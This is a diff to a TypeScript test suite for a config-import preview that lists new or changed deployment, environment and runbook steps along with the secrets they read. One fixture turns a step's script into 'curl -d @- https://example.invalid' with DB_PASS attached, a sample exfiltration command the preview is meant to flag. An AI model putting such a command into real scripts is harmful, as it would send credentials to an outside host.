@@ -887,6 +887,40 @@ describe('config import of playbook ops settings', () => {
     expect(plan.counts).toMatchObject({ update: 2, unchanged: 11 })
   })
 
+  it('the preview lists each step it adds or changes, with its script and the secrets it reads', async () => {
+    const { f, file } = await playbookSource()
+    const t = await makeTarget(f)
+    const plan = planImport(t.db, file)
+    const DB_PASS = { envName: 'DB_PASS', secret: 'Team / db-pass', gained: true }
+    expect(plan.steps).toEqual([
+      { kind: 'deployments', owner: 'api', step: 'migrate', action: 'add', script: 'echo migrate', secrets: [DB_PASS] },
+      { kind: 'deployments', owner: 'api', step: 'exec', action: 'add', script: 'ls', secrets: [] },
+      { kind: 'environments', owner: 'staging', step: 'warm', action: 'add', script: 'echo migrate', secrets: [{ ...DB_PASS, envName: 'TOKEN' }] },
+      { kind: 'runbooks', owner: 'Reindex', step: 'reindex', action: 'add', script: 'echo migrate', secrets: [DB_PASS] },
+    ])
+    importFile(t, file)
+    expect(planImport(t.db, file).steps).toEqual([])
+
+    // A changed script, and a step that now reads a secret: listed against what is here. A new name alone is not.
+    const edited = copy(file)
+    const [migrate, exec] = edited.deployments[0].steps!
+    exec.script = 'curl -d @- https://example.invalid'
+    exec.secrets = [{ envName: 'DB_PASS', secret: migrate.secrets[0].secret }]
+    migrate.name = 'migrate2'
+    const step = edited.runbooks![0].items[0] as { step: { script: string } }
+    step.step.script = 'echo reindex'
+    expect(planImport(t.db, edited).steps).toEqual([
+      { kind: 'deployments', owner: 'api', step: 'exec', action: 'update', script: 'curl -d @- https://example.invalid', before: 'ls', secrets: [DB_PASS] },
+      { kind: 'runbooks', owner: 'Reindex', step: 'reindex', action: 'update', script: 'echo reindex', before: 'echo migrate', secrets: [{ ...DB_PASS, gained: false }] },
+    ])
+  })
+
+  it('the preview lists an old file\'s hooks as steps', async () => {
+    const { f, file } = await sourceFile()
+    const t = await makeTarget(f)
+    expect(planImport(t.db, file).steps).toEqual([{ kind: 'deployments', owner: 'api', step: 'pre-hook', action: 'add', script: 'echo pre', secrets: [] }])
+  })
+
   it('a flow that uses a skipped service is not imported, with a reason, and the rest of the import goes on', async () => {
     const { f, file } = await playbookSource()
     const t = await makeTarget(f)
